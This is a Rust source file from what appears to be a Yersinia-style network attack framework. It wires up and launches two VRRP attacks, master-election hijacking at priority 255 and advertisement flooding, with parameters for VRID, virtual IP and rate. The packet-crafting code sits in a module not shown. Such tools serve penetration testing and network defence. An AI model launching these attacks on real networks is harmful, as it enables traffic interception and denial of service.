//! VRRP Protocol Implementation

use async_trait::async_trait;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::SystemTime;
use tokio::sync::RwLock;
use yersinia_core::{
    protocol::{AttackParams, Protocol, ProtocolStats},
    Attack, AttackContext, AttackDescriptor, AttackHandle, AttackId, AttackStatsCounters, Error,
    Interface, Packet, Parameter, ProtocolId, Result,
};

use super::attack::{VrrpDosAttack, VrrpMasterAttack};

pub struct VrrpProtocol {
    stats: Arc<RwLock<ProtocolStats>>,
    routers: Arc<RwLock<HashMap<u8, VrrpRouterInfo>>>,
}

#[derive(Debug, Clone)]
struct VrrpRouterInfo {
    _vrid: u8,
    _priority: u8,
    _last_seen: SystemTime,
}

impl VrrpProtocol {
    pub fn new() -> Self {
        Self {
            stats: Arc::new(RwLock::new(ProtocolStats::default())),
            routers: Arc::new(RwLock::new(HashMap::new())),
        }
    }
}

impl Default for VrrpProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Protocol for VrrpProtocol {
    fn name(&self) -> &'static str {
        "Virtual Router Redundancy Protocol"
    }

    fn shortname(&self) -> &'static str {
        "vrrp"
    }

    fn id(&self) -> ProtocolId {
        ProtocolId::VRRP
    }

    fn attacks(&self) -> &[AttackDescriptor] {
        static ATTACKS: [AttackDescriptor; 2] = [
            AttackDescriptor {
                id: AttackId(0),
                name: "VRRP Master Election Hijacking",
                description: "Become master router with priority 255",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(1),
                name: "VRRP DoS Attack",
                description: "Flood network with VRRP advertisements",
                parameters: vec![],
            },
        ];
        &ATTACKS
    }

    fn parameters(&self) -> Vec<Box<dyn Parameter>> {
        vec![]
    }

    fn handle_packet(&mut self, packet: &Packet) -> Result<()> {
        let mut stats = self
            .stats
            .try_write()
            .map_err(|_| Error::protocol("Failed to acquire stats lock"))?;

        stats.packets_received += 1;
        stats.bytes_received += packet.data.len() as u64;

        if packet.data.len() > 20 {
            stats.packets_parsed += 1;
        } else {
            stats.packets_errors += 1;
        }

        Ok(())
    }

    async fn launch_attack(
        &self,
        attack_id: AttackId,
        params: AttackParams,
        interface: &Interface,
    ) -> Result<AttackHandle> {
        let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
        let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let stats = Arc::new(AttackStatsCounters::default());

        let ctx = AttackContext {
            interface: interface.clone(),
            running: Arc::clone(&running),
            paused: Arc::clone(&paused),
            stats: Arc::clone(&stats),
        };

        let (attack_name, task_handle) = match attack_id.0 {
            0 => {
                let vrid = params.get_u32("vrid").unwrap_or(1) as u8;
                let virtual_ip_str = params.get_string("virtual_ip").unwrap_or("192.168.1.254");
                let virtual_ip = virtual_ip_str
                    .parse()
                    .map_err(|_| Error::protocol("Invalid virtual IP"))?;

                let attack = VrrpMasterAttack::new(vrid, virtual_ip);
                let name = attack.name().to_string();
                let handle = tokio::spawn(async move { attack.execute(ctx).await });
                (name, handle)
            }
            1 => {
                let rate_pps = params.get_u32("rate_pps").unwrap_or(100);
                let attack = VrrpDosAttack::new(rate_pps);
                let name = attack.name().to_string();
                let handle = tokio::spawn(async move { attack.execute(ctx).await });
                (name, handle)
            }
            _ => return Err(Error::protocol("Invalid attack ID")),
        };

        Ok(AttackHandle {
            id: uuid::Uuid::now_v7(),
            protocol: "VRRP".to_string(),
            attack_name,
            running,
            paused,
            stats,
            started_at: SystemTime::now(),
            task_handle: Some(task_handle),
        })
    }

    fn stats(&self) -> ProtocolStats {
        self.stats.try_read().map(|s| s.clone()).unwrap_or_default()
    }

    fn reset_stats(&mut self) {
        if let Ok(mut stats) = self.stats.try_write() {
            *stats = ProtocolStats::default();
        }
        if let Ok(mut routers) = self.routers.try_write() {
            routers.clear();
        }
    }
}
